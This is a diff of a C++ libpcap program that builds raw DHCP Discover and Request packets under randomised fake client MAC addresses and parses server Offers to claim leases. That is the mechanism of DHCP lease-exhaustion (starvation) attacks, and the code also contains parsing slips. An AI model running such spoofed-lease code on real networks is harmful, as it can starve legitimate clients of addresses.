@@ -82,13 +82,12 @@ int main(int argc, char *argv[])
 
 	for (size_t j = 0; j < 2; j++) {
 
-	vector<uint8_t> l2MAC = {0x68, 0x5d, 0x43, 0x2b, 0xc5, 0x37};
-	vector<uint8_t> fakeMAC = {0x2c, j, 0x0d, 0x04, 0x75, 0x33};
-	uint32_t transactionID = 0xa078944 + j;
+	vector<uint8_t> l2MAC = {{0x1c, 0x1b, 0x0d, 0x04, 0x7d, 0x50}}; //TODO nacitat z rozhrania
+	vector<uint8_t> fakeMAC = {0x2c, 0xa4, 0x0d, 0x04, j, rand()};
+	uint32_t transactionID = 0xa078944 + j + rand();
 
-	DHCPMessage msg;
-	//msg.setEthMAC({0x1c, 0x1b, 0x0d, 0x04, 0x7d, 0x50}); // pc
-	msg.setEthMAC(l2MAC); // ntb wifi
+	DHCPDiscovery msg;
+	msg.setEthMAC(l2MAC); // pc
 	msg.setFakeClientMAC(fakeMAC);
 	msg.setTransactionID(transactionID);
 
@@ -106,54 +105,86 @@ int main(int argc, char *argv[])
 		header.len = 0;
 		buf = (uint8_t *) pcap_next(handle, &header);
 
-		if (PcapUtil::timestamp() - startTime > 3000)
+		if (PcapUtil::timestamp() - startTime > 1000)
 			break;
 
 		if (header.len == 0)
 			continue;
 
 		DHCPMessage *dhcpMsg = DHCPMessage::fromRaw(buf, header.caplen);
-		dhcpMsg->toString("\n");
+//		cout << dhcpMsg->toString("\n");
+
+		//cout << sizeof(DHCPMessage) << endl;
+		//cout << header.len << endl;
+		uint8_t *options = buf + sizeof(DHCPMessage);
+		PacketInfo info;
+		for (size_t m = 0; m < 64;m++) {
+			//cout << hex << unsigned(*(options)) << endl;
+
+			switch (*options) {
+			case 0x35: // DHCP Message type
+				options++; // length
+				options++; // data
+				info.dhcpMessageType = *options;
+				options++;
+				break;
+
+			case 0x36: // DHCP server identifier
+				options++; // move to length
+				options++; //move to value
+
+				for (size_t p = 0; p < 4; p++) {
+					info.dhcpServerIdentifier[p] = *(options + p);
+					//cout << ":" << dec << unsigned(*(options + p)) << endl;
+				}
+
+				options = options + 4;
+			default:
+				options++;
+				uint8_t length = *options;
+				options++;
+				options += length;
+			}
+		}
+
+		//cout << info.toString("\n") << endl;
+
 		auto it = packets.find(dhcpMsg->dhcpHeader.transactionID);
 		if (it ==  packets.end())
 			cerr << "koniec" << endl;
 		else {
-			if (dhcpMsg->dhcpHeader.opCode == 1)
+			if (info.dhcpMessageType == 1)
 				cout << "discoery" << endl;
-			else if (dhcpMsg->dhcpHeader.opCode == 2) {
+			else if (info.dhcpMessageType == 2) {
 				cout << "offer" << endl;
 
-				cout << dhcpMsg->toString("\n") << endl;
+				//cout << dhcpMsg->toString("\n") << endl;
 
-				DHCPMessage wawa;
+				DHCPRequest wawa;
 				wawa.setFakeClientMAC(fakeMAC);
-				wawa.setTransactionID(htonl(htonl(transactionID)+1));
+				wawa.setTransactionID(htonl(htonl(transactionID)));
 
 				wawa.setEthMAC(l2MAC); // ntb wifi
 				wawa.setFakeClientMAC(fakeMAC);
-				wawa.dhcpData.op1payload = 0x03;
+				//wawa.dhcpData.op1payload = 0x03;
 
-				/*wawa.ipHeader.dstIPAddr[0] = 192;
-				wawa.ipHeader.dstIPAddr[1] = 168;
-				wawa.ipHeader.dstIPAddr[2] = 43;
-				wawa.ipHeader.dstIPAddr[3] = 1;
-*/
-
-				for (size_t p = 0; p < 6; p++) {
-					wawa.dhcpData.op2payload[p] = fakeMAC.at(p);
-				}
-
-				for (size_t i = 0; i < 4; i++) {
-				//	wawa.dhcpData.op3payload[i] = dhcpMsg->dhcpHeader.yourIPAddr[i];
-					wawa.dhcpData.op5payload[i] = dhcpMsg->dhcpHeader.serverIPAddr[i];
+				for (size_t p = 0; p < 4; p++) {
+					wawa.op1payload[p] = dhcpMsg->dhcpHeader.yourIPAddr[p];
+					wawa.op2payload[p] = info.dhcpServerIdentifier[p];
 				}
 
 				pcap_sendpacket(handle, (const u_char *) &wawa, sizeof(wawa));
 				cout << "send" << endl;
-				exit(1);
 
-			} else
+
+			}
+			else if (info.dhcpMessageType == 3) {
+				cout << "ack" << endl;
+				break;
+			}
+			else {
 				cout << "unknown" << endl;
+			}
 		}
 	}
 	}
